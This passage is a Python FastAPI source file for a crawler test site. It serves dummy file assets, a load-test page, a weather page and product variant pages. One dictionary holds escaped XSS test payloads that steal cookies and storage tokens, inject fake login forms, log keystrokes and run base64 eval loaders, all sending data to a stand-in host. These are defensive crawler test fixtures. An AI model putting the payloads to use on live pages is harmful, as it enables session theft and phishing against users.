import asyncio
import io
import json
import re
import urllib.error
import urllib.request
import zipfile
from datetime import datetime
from functools import lru_cache
from html import escape
from pathlib import Path
from typing import List
from urllib.parse import quote, urlencode
from zoneinfo import ZoneInfo

from fastapi import FastAPI, Request, Response
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse

from app.depth_config import MAX_DEPTH_LEVEL, TOTAL_DEPTH_PAGES
from app.depth_routes import depth_router
from app.product_catalog import (
    PRODUCT_BRAND,
    PRODUCT_COLORS,
    PRODUCT_DEFAULT_COLOR,
    PRODUCT_DEFAULT_SIZE,
    PRODUCT_NAME,
    PRODUCT_RATING,
    PRODUCT_REVIEW_COUNT,
    PRODUCT_SIZES,
    iter_product_variants,
    laptop_configurator_data_payload,
    product_data_payload,
    product_variant,
)
from app.test_catalog import PAGE_MANIFEST, SECTION_METADATA, TEST_SECTIONS


app = FastAPI(
    title="Crawl Test Site",
    version="0.1.0",
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)

app.include_router(depth_router)

APP_DIR = Path(__file__).resolve().parent


def minimal_docx_bytes() -> bytes:
    document_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Sample DOCX asset for crawler MIME type testing.</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
"""
    content_types_xml = """<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
"""
    rels_xml = """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as docx:
        docx.writestr("[Content_Types].xml", content_types_xml)
        docx.writestr("_rels/.rels", rels_xml)
        docx.writestr("word/document.xml", document_xml)
    return buffer.getvalue()


MINIMAL_PDF = b"""%PDF-1.1
1 0 obj<<>>endobj
2 0 obj<< /Type /Catalog /Pages 3 0 R >>endobj
3 0 obj<< /Type /Pages /Kids [4 0 R] /Count 1 >>endobj
4 0 obj<< /Type /Page /Parent 3 0 R /MediaBox [0 0 200 200] /Contents 5 0 R >>endobj
5 0 obj<< /Length 44 >>stream
BT /F1 12 Tf 20 120 Td (Sample PDF asset) Tj ET
endstream endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000030 00000 n
0000000081 00000 n
0000000138 00000 n
0000000230 00000 n
trailer<< /Root 2 0 R /Size 6 >>
startxref
325
%%EOF
"""

MINIMAL_JPG = bytes.fromhex(
    "ffd8ffe000104a46494600010100000100010000ffdb004300"
    "080606070605080707070909080a0c140d0c0b0b0c19120f13"
    "1d1a1f1e1d1a1c1c202428302924222c231c1c28372a2c3133"
    "3434341f27393d38323c2e333432ffc0000b08000100010101"
    "1100ffc40014000100000000000000000000000000000000ff"
    "c40014100100000000000000000000000000000000ffda0008"
    "01010000003f00ffd9"
)

MINIMAL_ZIP = bytes.fromhex("504b03041400000000000000000000000000000000000000000000")
MINIMAL_DOCX = minimal_docx_bytes()
LOAD_TEST_TARGET_BYTES = 7_500_000
LOAD_TEST_TITLE = "Large Static Load-Test Page"
LOAD_TEST_LOREM_PARAGRAPHS = [
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus vitae magna aliquet facilisis. Integer nec odio, praesent libero, sed cursus ante dapibus diam.",
    "Sed nisi nulla, quis sem at nibh elementum imperdiet. Duis sagittis ipsum, praesent mauris, fusce nec tellus sed augue semper porta.",
    "Mauris massa, vestibulum lacinia arcu eget, nulla class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.",
    "Curabitur sodales ligula in libero. Sed dignissim lacinia nunc, curabitur tortor, pellentesque nibh, aenean quam, in scelerisque sem at dolor.",
    "Maecenas mattis, sed convallis tristique sem. Proin ut ligula vel nunc egestas porttitor, morbi lectus risus, iaculis vel suscipit quis, luctus non massa.",
    "Fusce ac turpis quis ligula lacinia aliquet. Mauris ipsum, nulla metus metus, ullamcorper vel tincidunt sed, euismod in nibh.",
    "Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.",
    "Nam nec ante. Sed lacinia, urna non tincidunt mattis, tortor neque adipiscing diam, a cursus ipsum ante quis turpis.",
    "Nulla facilisi. Ut fringilla, suspendisse potenti, nunc feugiat mi a tellus consequat imperdiet, vestibulum sapien proin quam.",
    "Etiam ultrices, suspendisse in justo eu magna luctus suscipit. Sed lectus, integer euismod lacus luctus magna, quisque cursus metus vitae pharetra auctor.",
]

VANCOUVER_TZ = ZoneInfo("America/Vancouver")
DEFAULT_WEATHER_CITY = "vancouver"
WEATHER_LOCATIONS = {
    "vancouver": {"name": "Vancouver, BC", "sentence_name": "Vancouver BC"},
    "surrey": {"name": "Surrey, BC", "sentence_name": "Surrey BC"},
    "burnaby": {"name": "Burnaby, BC", "sentence_name": "Burnaby BC"},
    "richmond": {"name": "Richmond, BC", "sentence_name": "Richmond BC"},
    "toronto": {"name": "Toronto, ON", "sentence_name": "Toronto ON"},
}
for weather_location in WEATHER_LOCATIONS.values():
    weather_location["source_url"] = f"https://weather.gc.ca/city/jump_e.html?city={quote(weather_location['name'])}"
    weather_location["source_sentence"] = "Weather source: Environment and Climate Change Canada / weather.gc.ca."
WEATHER_IMAGES = {
    "sunny": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 160"><rect width="240" height="160" fill="#e7f5ff"/><circle cx="120" cy="78" r="34" fill="#ffd43b"/><g stroke="#f08c00" stroke-width="8" stroke-linecap="round"><path d="M120 18v18"/><path d="M120 120v18"/><path d="M60 78H42"/><path d="M198 78h-18"/><path d="m77 35 13 13"/><path d="m163 121-13-13"/><path d="m77 121 13-13"/><path d="m163 35-13 13"/></g></svg>""",
    "cloudy": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 160"><rect width="240" height="160" fill="#edf2ff"/><path fill="#adb5bd" d="M74 112c-21 0-38-15-38-34 0-18 15-32 34-34 10-21 32-34 57-34 34 0 62 24 65 55 16 5 27 18 27 34 0 19-17 34-38 34H74Z"/><path fill="#dee2e6" d="M66 124c-18 0-33-13-33-30 0-15 12-28 29-30 9-18 28-29 50-29 30 0 54 21 57 48 14 4 24 16 24 30 0 17-15 30-33 30H66Z"/></svg>""",
    "rainy": """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 160"><rect width="240" height="160" fill="#e3fafc"/><path fill="#868e96" d="M74 92c-19 0-34-13-34-30 0-16 13-29 31-30 9-18 29-30 52-30 31 0 57 22 59 50 15 4 26 17 26 31 0 17-15 30-34 30H74Z"/><g stroke="#228be6" stroke-width="8" stroke-linecap="round"><path d="m76 126-10 20"/><path d="m118 126-10 20"/><path d="m160 126-10 20"/></g></svg>""",
}


def html_document(title: str, body: str, head: str = "", script: str = "", lang: str = "") -> str:
    lang_attr = f' lang="{lang}"' if lang else ""
    return f"""<!doctype html>
<html{lang_attr}>
  <head>
    <meta charset="utf-8" />
    <title>{title}</title>
    {head}
  </head>
  <body>
    <header>
      <h1>{title}</h1>
    </header>
    <main>
      {body}
    </main>
{script}
  </body>
</html>"""


def html_page(title: str, body: str, head: str = "", script: str = "", lang: str = "") -> HTMLResponse:
    return HTMLResponse(html_document(title, body, head=head, script=script, lang=lang))


def repeated_nav() -> str:
    block = """
    <nav class="nav repeated-nav">
      <a href="/about">About</a>
      <a href="/docs">Docs</a>
      <a href="/client">Client</a>
      <a href="/many-links">Many Links</a>
      <a href="/files/sample.pdf">PDF</a>
      <a href="/media/pixel.jpg">Image</a>
    </nav>
    """
    return "".join(block for _ in range(12))


def item_links(limit: int) -> str:
    parts: List[str] = []
    for index in range(limit):
        parts.append(f'<li><a href="/many/item/{index}?ref=list">Item {index}</a></li>')
    return "".join(parts)


def load_test_section(index: int) -> str:
    marker = f"{index:05d}"
    paragraphs = "\n".join(
        f'      <p data-paragraph="{paragraph_index:02d}">{escape(text)}</p>'
        for paragraph_index, text in enumerate(LOAD_TEST_LOREM_PARAGRAPHS, start=1)
    )
    return f"""
    <article class="load-test-section" id="load-section-{marker}">
      <h2>Lorem Ipsum Block {marker}</h2>
{paragraphs}
    </article>
    """


@lru_cache(maxsize=1)
def load_test_body() -> str:
    parts: List[str] = [
        f"""
    <p>This page is a large static load-test route with at least {LOAD_TEST_TARGET_BYTES} bytes of initial HTML.</p>
    <p>It repeats a 10-paragraph lorem ipsum block so the route stresses crawler download, HTML parsing, text extraction, and static export output size without relying on delayed JavaScript.</p>
    <nav>
      <a href="/about?from=load-test">About reference</a>
      <a href="/many-links?from=load-test">Many links reference</a>
      <a href="/structured-content?from=load-test">Structured content reference</a>
    </nav>
    """
    ]
    section_index = 0
    while True:
        parts.append(load_test_section(section_index))
        if section_index % 10 == 0:
            body = "".join(parts)
            if len(html_document(LOAD_TEST_TITLE, body).encode("utf-8")) >= LOAD_TEST_TARGET_BYTES:
                return body
        section_index += 1


def vancouver_today() -> str:
    return datetime.now(VANCOUVER_TZ).strftime("%m/%d/%Y")


def weather_image_kind(summary: str) -> str:
    normalized = summary.lower()
    if any(term in normalized for term in ("rain", "shower", "drizzle")):
        return "rainy"
    if any(term in normalized for term in ("sun", "clear", "fair")):
        return "sunny"
    return "cloudy"


def weather_image_src(kind: str) -> str:
    return f"data:image/svg+xml,{quote(WEATHER_IMAGES[kind], safe='')}"


def weather_city_key(city: str) -> str:
    normalized = (city or DEFAULT_WEATHER_CITY).strip().lower()
    return normalized if normalized in WEATHER_LOCATIONS else DEFAULT_WEATHER_CITY


def parse_weather(html: str) -> dict[str, str]:
    text = re.sub(r"<[^>]+>", " ", html)
    condition_match = re.search(r"Condition:\s*</[^>]+>\s*<[^>]+>\s*([^<]+)", html, re.IGNORECASE)
    if not condition_match:
        condition_match = re.search(
            r"Condition:\s*([A-Za-z][A-Za-z ]+?)(?=\s+(Pressure|Temperature|Dew point|Humidity|Wind|Visibility):)",
            text,
            re.IGNORECASE,
        )
    temperature_match = re.search(r"Temperature:\s*(-?\d+(?:\.\d+)?)\s*°?\s*C", text, re.IGNORECASE)
    summary = " ".join(condition_match.group(1).split()) if condition_match else "unavailable"
    temperature = f"{temperature_match.group(1)}°C" if temperature_match else "unavailable"
    return {
        "summary": summary or "unavailable",
        "temperature": temperature,
    }


def fetch_weather(city: str) -> dict[str, str]:
    city_key = weather_city_key(city)
    request = urllib.request.Request(
        WEATHER_LOCATIONS[city_key]["source_url"],
        headers={"User-Agent": "crawl-test-site/1.0"},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            html = response.read().decode("utf-8", errors="replace")
    except (OSError, urllib.error.URLError, TimeoutError):
        return {"summary": "unavailable", "temperature": "unavailable"}
    return parse_weather(html)


def weather_payload(city: str = DEFAULT_WEATHER_CITY) -> dict:
    city_key = weather_city_key(city)
    location = WEATHER_LOCATIONS[city_key]
    weather = fetch_weather(city_key)
    weather_kind = weather_image_kind(weather["summary"])
    image_alt = f"Generic {weather_kind} weather image"
    today = vancouver_today()
    return {
        "city": city_key,
        "location": location["name"],
        "sentence_location": location["sentence_name"],
        "date": today,
        "summary": weather["summary"],
        "temperature": weather["temperature"],
        "sentence": f"Today's date is {today}, the weather in {location['sentence_name']} is {weather['summary']}.",
        "temperature_sentence": f"The temperature in {location['sentence_name']} today is {weather['temperature']}.",
        "source_sentence": location["source_sentence"],
        "image": {
            "kind": weather_kind,
            "src": weather_image_src(weather_kind),
            "alt": image_alt,
        },
    }


def vancouver_daily_weather_body() -> str:
    weather = weather_payload(DEFAULT_WEATHER_CITY)
    options = "".join(
        f'<option value="{escape(city_key, quote=True)}"{" selected" if city_key == weather["city"] else ""}>'
        f'{escape(location["name"])}</option>'
        for city_key, location in WEATHER_LOCATIONS.items()
    )
    return f"""
    <article>
      <label for="weather-city">Weather city</label>
      <select id="weather-city">{options}</select>
      <p id="weather-date-sentence">Today's date is {escape(weather["date"])}, the weather in {escape(weather["sentence_location"])} is {escape(weather["summary"])}.</p>
      <p id="weather-temperature-sentence">The temperature in {escape(weather["sentence_location"])} today is {escape(weather["temperature"])}.</p>
      <img id="weather-image" src="{escape(weather["image"]["src"], quote=True)}" alt="{escape(weather["image"]["alt"], quote=True)}" width="240" height="160" />
      <p>This daily weather report updates by Vancouver local date at 00:00 America/Vancouver.</p>
      <p id="weather-source-sentence">{escape(weather["source_sentence"])}</p>
    </article>
    """


def vancouver_daily_weather_script() -> str:
    return """
    <script>
      const weatherCitySelect = document.querySelector("#weather-city");
      const weatherDateSentence = document.querySelector("#weather-date-sentence");
      const weatherTemperatureSentence = document.querySelector("#weather-temperature-sentence");
      const weatherSourceSentence = document.querySelector("#weather-source-sentence");
      const weatherImage = document.querySelector("#weather-image");

      async function updateWeatherCity() {
        const response = await fetch(`/weather/vancouver-daily-report/data.json?city=${encodeURIComponent(weatherCitySelect.value)}`);
        const payload = await response.json();
        weatherDateSentence.textContent = payload.sentence;
        weatherTemperatureSentence.textContent = payload.temperature_sentence;
        weatherSourceSentence.textContent = payload.source_sentence;
        weatherImage.src = payload.image.src;
        weatherImage.alt = payload.image.alt;
      }

      weatherCitySelect.addEventListener("change", updateWeatherCity);
    </script>
    """


def homepage_href(href: str, request: Request) -> str:
    return href.format(
        base=str(request.base_url).rstrip("/"),
        netloc=request.url.netloc,
        encoded_query=urlencode({"q": "hello world", "encoded": "%2Fdocs"}),
    )


def html_attributes(attributes: List[tuple]) -> str:
    return "".join(
        f' {escape(str(name), quote=True)}="{escape(str(value), quote=True)}"'
        for name, value in attributes
    )


def homepage_anchor(link: dict, request: Request) -> str:
    attributes = []
    if "href" in link:
        attributes.append(("href", homepage_href(link["href"], request)))
    attributes.extend(link.get("attrs", {}).items())

    return f"<a{html_attributes(attributes)}>{escape(link['label'])}</a>"


def homepage_sections(request: Request) -> str:
    section_blocks = []
    for section in TEST_SECTIONS:
        link_items = []
        for entry in section["entries"]:
            for link in entry.get("home_links", []):
                link_items.append(f"      <li>{homepage_anchor(link, request)}</li>")

        if not link_items:
            continue

        section_blocks.append(
            f"""
    <section id="{escape(section['id'], quote=True)}">
      <h2>{escape(section['title'])}</h2>
      <ul>
{chr(10).join(link_items)}
      </ul>
    </section>"""
        )

    return "".join(section_blocks)


SECURITY_TEST_GROUPS = {
    "cookie-theft": {
        "title": "Cookie Theft",
        "cases": [
            (
                "A1",
                "Script steals cookie",
                "<script>fetch('/collect/cookie?v=' + encodeURIComponent(document.cookie))</script>",
                "Crawler output should keep the script-looking text inert when displayed as HTML.",
            ),
            (
                "A2",
                "Image onerror steals cookie",
                "<img src=x onerror=\"fetch('/collect/cookie?v=' + encodeURIComponent(document.cookie))\">",
                "Crawler output should not render this as an executable image error handler.",
            ),
            (
                "A3",
                "SVG onload steals cookie",
                "<svg onload=\"navigator.sendBeacon('/collect/cookie', document.cookie)\"></svg>",
                "Crawler output should not render this as an executable SVG load handler.",
            ),
            (
                "A4",
                "Delayed cookie steal with setTimeout",
                "<script>setTimeout(() => fetch('/collect/cookie?v=' + encodeURIComponent(document.cookie)), 1500)</script>",
                "Crawler output should keep delayed script text inert.",
            ),
        ],
    },
    "storage-theft": {
        "title": "Storage Theft",
        "cases": [
            (
                "B1",
                "Steal localStorage",
                "<script>fetch('https://collector.invalid/local?value=' + encodeURIComponent(localStorage.getItem('token') || ''))</script>",
                "Crawler output should not execute localStorage-reading script text.",
            ),
            (
                "B2",
                "Steal sessionStorage",
                "<script>fetch('https://collector.invalid/session?value=' + encodeURIComponent(sessionStorage.getItem('token') || ''))</script>",
                "Crawler output should not execute sessionStorage-reading script text.",
            ),
            (
                "B3",
                "Steal cookies and both storage objects",
                "<script>fetch('https://collector.invalid/all', {method:'POST', body: JSON.stringify({cookie: document.cookie, local: {...localStorage}, session: {...sessionStorage}})})</script>",
                "Crawler output should keep combined credential-reading payload text inert.",
            ),
        ],
    },
    "page-hijack": {
        "title": "Page Hijack",
        "cases": [
            (
                "C1",
                "window.location redirect",
                "<script>window.location='https://collector.invalid/redirected'</script>",
                "Crawler output should not redirect the user when displayed.",
            ),
            (
                "C2",
                "Meta refresh redirect",
                "<meta http-equiv=\"refresh\" content=\"0;url=https://collector.invalid/meta-refresh\">",
                "Crawler output should not create an active meta refresh tag.",
            ),
            (
                "C3",
                "Replace page with fake login form",
                "<script>document.body.innerHTML='<form action=\"https://collector.invalid/login\"><input name=\"email\"><input name=\"password\" type=\"password\"><button>Sign in</button></form>'</script>",
                "Crawler output should not allow script text to replace the host page.",
            ),
        ],
    },
    "phishing": {
        "title": "Phishing",
        "cases": [
            (
                "D1",
                "Injected fake login form",
                "<form action=\"https://collector.invalid/phish\" method=\"post\"><label>Email <input name=\"email\"></label><label>Password <input type=\"password\" name=\"password\"></label><button>Sign in</button></form>",
                "Crawler output should display this as text, not as a working login form.",
            ),
            (
                "D2",
                "Invisible overlay capturing clicks",
                "<div style=\"position:fixed;inset:0;z-index:9999;opacity:0.01\" onclick=\"fetch('https://collector.invalid/click?x='+event.clientX+'&y='+event.clientY)\"></div>",
                "Crawler output should not render an overlay or clickable handler.",
            ),
        ],
    },
    "keylogger": {
        "title": "Keylogger",
        "cases": [
            (
                "E1",
                "Capture all keystrokes",
                "<script>document.addEventListener('keydown', e => fetch('https://collector.invalid/key?k=' + encodeURIComponent(e.key)))</script>",
                "Crawler output should not attach a document-level key listener.",
            ),
            (
                "E2",
                "Capture input field keystrokes only",
                "<input onkeydown=\"fetch('https://collector.invalid/input?k=' + encodeURIComponent(event.key))\" autofocus>",
                "Crawler output should not render an active input event handler.",
            ),
        ],
    },
    "beacon-recon": {
        "title": "Beacon / Recon",
        "cases": [
            (
                "F1",
                "Tracking pixel without JavaScript",
                "<img src=\"https://collector.invalid/pixel?case=F1\" width=\"1\" height=\"1\" alt=\"\">",
                "Crawler output should not render this as a network-loading pixel.",
            ),
            (
                "F2",
                "Send userAgent, screen, and URL",
                "<script>navigator.sendBeacon('https://collector.invalid/recon', JSON.stringify({ua:navigator.userAgent, screen: screen.width + 'x' + screen.height, url: location.href}))</script>",
                "Crawler output should not execute browser reconnaissance code.",
            ),
            (
                "F3",
                "Send list of all links on page",
                "<script>fetch('https://collector.invalid/links', {method:'POST', body:[...document.links].map(a=>a.href).join('\\n')})</script>",
                "Crawler output should not execute link enumeration code.",
            ),
        ],
    },
    "obfuscated": {
        "title": "Obfuscated",
        "cases": [
            (
                "G1",
                "URL-encoded script",
                "%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
                "Crawler output should not decode this into active script HTML during display.",
            ),
            (
                "G2",
                "Mixed-case script tags",
                "<ScRiPt>fetch('https://collector.invalid/mixed?c=' + document.cookie)</sCrIpT>",
                "Crawler output should not treat mixed-case tags as executable HTML.",
            ),
            (
                "G3",
                "Split across attributes",
                "<img src=\"x\" onerror=\"this['on'+'error']=null;fetch('https://collector.invalid/split?c='+document.cookie)\">",
                "Crawler output should not render reconstructed handler logic.",
            ),
            (
                "G4",
                "Base64 plus atob",
                "<script>eval(atob('ZmV0Y2goJ2h0dHBzOi8vY29sbGVjdG9yLmludmFsaWQvYjY0P2M9Jytkb2N1bWVudC5jb29raWUp'))</script>",
                "Crawler output should keep encoded script loaders inert.",
            ),
        ],
    },
    "bad-links": {
        "title": "Bad Links",
        "cases": [
            (
                "H1",
                "javascript: href",
                "<a href=\"javascript:fetch('https://collector.invalid/js-href?c='+document.cookie)\">Open report</a>",
                "Crawler output should not create an active javascript: link.",
            ),
            (
                "H2",
                "data: URL href",
                "<a href=\"data:text/html,<script>fetch('https://collector.invalid/data-url?c='+document.cookie)</script>\">Open data URL</a>",
                "Crawler output should not create an active data: link with script content.",
            ),
            (
                "H3",
                "Tabnabbing target blank without noopener",
                "<a href=\"https://collector.invalid/blank\" target=\"_blank\">Open report in new tab</a>",
                "Crawler output should not render unsafe target blank links without normalization.",
            ),
        ],
    },
    "clean-controls": {
        "title": "Clean Controls",
        "cases": [
            (
                "I1",
                "Normal page and safe link",
                "<p>Normal page with a safe <a href=\"/about\">About</a> link.</p>",
                "Crawler output should preserve harmless content without treating it as a threat.",
            ),
            (
                "I2",
                "Word script in plain text",
                "The word script appears in plain text and should not be treated as code.",
                "Crawler output should not flag plain text just because it contains the word script.",
            ),
            (
                "I3",
                "Real image",
                "<img src=\"/media/pixel.jpg\" alt=\"Real image test\">",
                "Crawler output should allow ordinary image references when rendered safely.",
            ),
            (
                "I4",
                "document.cookie inside code block",
                "<code>document.cookie</code> appears as documentation only.",
                "Crawler output should display code text without executing or over-blocking it.",
            ),
        ],
    },
}


def security_test_head() -> str:
    return """
    <style>
      .security-test-table {
        border-collapse: collapse;
        max-width: 1120px;
        width: 100%;
      }
      .security-test-table th,
      .security-test-table td {
        border: 1px solid #888;
        padding: 8px;
        text-align: left;
        vertical-align: top;
      }
      .security-test-table pre {
        margin: 0;
        max-width: 560px;
        overflow-wrap: anywhere;
        white-space: pre-wrap;
      }
    </style>
    """


def security_test_body(group_slug: str) -> str:
    group = SECURITY_TEST_GROUPS[group_slug]
    rows = []
    for case_id, case_name, payload, expected in group["cases"]:
        rows.append(
            f"""
        <tr>
          <th scope="row">{escape(case_id)}</th>
          <td>{escape(case_name)}</td>
          <td><pre><code>{escape(payload)}</code></pre></td>
          <td>{escape(expected)}</td>
        </tr>"""
        )

    return f"""
    <article>
      <p>These cases intentionally expose XSS-looking payload text as escaped content. They should remain inert on this site and in any crawl-service HTML display.</p>
      <table class="security-test-table">
        <caption>{escape(group["title"])} Security Test Cases</caption>
        <thead>
          <tr>
            <th scope="col">Case</th>
            <th scope="col">Name</th>
            <th scope="col">Escaped Payload Text</th>
            <th scope="col">Expected Behavior</th>
          </tr>
        </thead>
        <tbody>
{chr(10).join(rows)}
        </tbody>
      </table>
      <p><a href="/">Back to crawl test home</a></p>
    </article>
    """


def food_paragraph(topic: str) -> str:
    return (
        f"{topic} page content about spring noodles, dumpling broth, crispy "
        "vegetables, and a tiny kitchen notebook full of sauce experiments."
    )


def product_page_head() -> str:
    return """
    <style>
      .product-breadcrumbs {
        margin-bottom: 16px;
      }
      .product-breadcrumbs a {
        margin-right: 8px;
      }
      .product-grid {
        display: grid;
        gap: 24px;
        grid-template-columns: minmax(240px, 360px) minmax(300px, 1fr);
        max-width: 980px;
      }
      .product-visual {
        align-items: center;
        background: linear-gradient(145deg, var(--swatch), #f8f8f8);
        border: 1px solid #777;
        color: #111;
        display: flex;
        min-height: 320px;
        justify-content: center;
        padding: 20px;
        text-align: center;
      }
      .product-visual strong {
        background: rgba(255, 255, 255, 0.82);
        border: 1px solid #666;
        display: inline-block;
        padding: 12px;
      }
      .variant-options {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
        margin: 8px 0 16px;
      }
      .variant-options a,
      .variant-options button {
        background: #fff;
        border: 1px solid #555;
        color: #111;
        cursor: pointer;
        padding: 8px 10px;
        text-decoration: none;
      }
      .variant-options a[aria-current="page"],
      .variant-options button[aria-pressed="true"] {
        border: 3px solid #111;
        padding: 6px 8px;
      }
      .variant-options button:disabled {
        background: #eee;
        color: #666;
        cursor: not-allowed;
        text-decoration: line-through;
      }
      .configurator-notice {
        border-left: 4px solid #777;
        margin-top: 12px;
        padding: 8px 12px;
      }
      .configurator-notice:empty {
        display: none;
      }
      .product-price {
        font-size: 1.5rem;
        font-weight: 700;
      }
      .product-section {
        margin-top: 24px;
        max-width: 980px;
      }
      .product-specs {
        border-collapse: collapse;
        width: 100%;
      }
      .product-specs th,
      .product-specs td {
        border: 1px solid #888;
        padding: 8px;
        text-align: left;
      }
      .variant-matrix {
        border-collapse: collapse;
        margin-top: 12px;
      }
      .variant-matrix th,
      .variant-matrix td {
        border: 1px solid #aaa;
        padding: 8px;
      }
      @media (max-width: 760px) {
        .product-grid {
          grid-template-columns: 1fr;
        }
      }
    </style>
    """


def product_variant_path(color_slug: str, size_slug: str) -> str:
    return f"/product-pages/separate-pages/{color_slug}/{size_slug}"


def product_breadcrumbs(current_label: str) -> str:
    return f"""
    <nav class="product-breadcrumbs" aria-label="Breadcrumb">
      <a href="/">Home</a>
      <span>/</span>
      <a href="/product-pages/separate-pages">Product Pages</a>
      <span>/</span>
      <span>{escape(current_label)}</span>
    </nav>
    """


def product_color_links(selected_color: str, selected_size: str) -> str:
    links = []
    for color_slug, color in PRODUCT_COLORS.items():
        current = ' aria-current="page"' if color_slug == selected_color else ""
        links.append(
            f'<a href="{product_variant_path(color_slug, selected_size)}"{current}>'
            f"{escape(color['name'])}</a>"
        )
    return "".join(links)


def product_size_links(selected_color: str, selected_size: str) -> str:
    links = []
    for size_slug, size in PRODUCT_SIZES.items():
        current = ' aria-current="page"' if size_slug == selected_size else ""
        links.append(
            f'<a href="{product_variant_path(selected_color, size_slug)}"{current}>'
            f"{escape(size['name'])}</a>"
        )
    return "".join(links)


def product_variant_matrix() -> str:
    rows = []
    for variant in iter_product_variants():
        href = product_variant_path(variant["color_slug"], variant["size_slug"])
        rows.append(
            f"""
        <tr>
          <td><a href="{href}">{escape(variant['color_name'])} / {escape(variant['size_name'])}</a></td>
          <td>{escape(variant['sku'])}</td>
          <td>{escape(variant['price'])}</td>
          <td>{escape(variant['stock_status'])}</td>
        </tr>"""
        )
    return "".join(rows)


def product_query_params_path(color_slug: str, size_slug: str) -> str:
    return f"/product-pages/query-params?color={color_slug}&size={size_slug}"


def product_color_links_qp(selected_color: str, selected_size: str) -> str:
    links = []
    for color_slug, color in PRODUCT_COLORS.items():
        current = ' aria-current="page"' if color_slug == selected_color else ""
        links.append(
            f'<a href="{product_query_params_path(color_slug, selected_size)}"{current}>'
            f"{escape(color['name'])}</a>"
        )
    return "".join(links)


def product_size_links_qp(selected_color: str, selected_size: str) -> str:
    links = []
    for size_slug, size in PRODUCT_SIZES.items():
        current = ' aria-current="page"' if size_slug == selected_size else ""
        links.append(
            f'<a href="{product_query_params_path(selected_color, size_slug)}"{current}>'
            f"{escape(size['name'])}</a>"
        )
    return "".join(links)


def product_variant_matrix_qp() -> str:
    rows = []
    for variant in iter_product_variants():
        href = product_query_params_path(variant["color_slug"], variant["size_slug"])
        rows.append(
            f"""
        <tr>
          <td><a href="{href}">{escape(variant['color_name'])} / {escape(variant['size_name'])}</a></td>
          <td>{escape(variant['sku'])}</td>
          <td>{escape(variant['price'])}</td>
          <td>{escape(variant['stock_status'])}</td>
        </tr>"""
        )
    return "".join(rows)


def product_feature_items(variant: dict) -> str:
    return "".join(f"<li>{escape(feature)}</li>" for feature in variant["feature_bullets"])


def product_specs_rows(variant: dict) -> str:
    rows = [
        ("SKU", variant["sku"]),
        ("Capacity", variant["capacity"]),
        ("Dimensions", variant["dimensions"]),
        ("Weight", variant["weight"]),
        ("Finish", variant["finish"]),
        ("Stock", f"{variant['stock_status']} ({variant['stock_quantity']} units)"),
    ]
    return "".join(
        f"<tr><th scope=\"row\">{escape(label)}</th><td>{escape(str(value))}</td></tr>"
        for label, value in rows
    )


def product_common_sections(variant: dict) -> str:
    return f"""
    <section class="product-section">
      <h2>Details</h2>
      <p>The TrailForge bottle is a fictional crawl-test product with variant-heavy commerce content, designed to mimic practical product pages with size, color, stock, and shipping changes.</p>
      <ul>
        {product_feature_items(variant)}
      </ul>
    </section>
    <section class="product-section">
      <h2>Specifications</h2>
      <table class="product-specs">
        <tbody>
          {product_specs_rows(variant)}
        </tbody>
      </table>
    </section>
    <section class="product-section">
      <h2>Return Policy</h2>
      <p>Unused bottles can be returned within 30 days. Open-box returns are inspected before refund approval.</p>
    </section>
    <section class="product-section">
      <h2>FAQ</h2>
      <details open>
        <summary>Does it fit a bike cage?</summary>
        <p>The 18 oz and 24 oz sizes fit most oversized cages. The 32 oz size is better for bags and desks.</p>
      </details>
      <details>
        <summary>Is the lid leakproof?</summary>
        <p>Yes. The carry cap uses a threaded seal intended for commute and backpack testing.</p>
      </details>
    </section>
    <section class="product-section">
      <h2>Related Accessories</h2>
      <ul>
        <li><a href="/query-page?accessory=straw-lid">Straw lid accessory</a></li>
        <li><a href="/query-page?accessory=cleaning-kit">Bottle cleaning kit</a></li>
        <li><a href="/query-page?accessory=carry-sling">Trail carry sling</a></li>
      </ul>
    </section>
    """


def product_separate_page(color_slug: str, size_slug: str) -> HTMLResponse:
    variant = product_variant(color_slug, size_slug)
    title = f"Product variants - Separate pages: {variant['color_name']} {variant['size_name']}"
    body = f"""
    {product_breadcrumbs("Separate variant pages")}
    <article class="product-grid">
      <section class="product-visual" style="--swatch: {escape(variant['swatch'], quote=True)}">
        <strong>{escape(variant['visual_label'])}</strong>
      </section>
      <section>
        <p>{escape(PRODUCT_BRAND)}</p>
        <h2>{escape(PRODUCT_NAME)}</h2>
        <p>{escape(PRODUCT_RATING)} stars from {escape(PRODUCT_REVIEW_COUNT)} reviews</p>
        <p class="product-price">{escape(variant['price'])}</p>
        <p><strong>Selected:</strong> {escape(variant['color_name'])} / {escape(variant['size_name'])}</p>
        <p><strong>SKU:</strong> {escape(variant['sku'])}</p>
        <p><strong>Availability:</strong> {escape(variant['stock_status'])} ({variant['stock_quantity']} units)</p>
        <p><strong>Shipping:</strong> {escape(variant['shipping_message'])}</p>
        <h3>Color</h3>
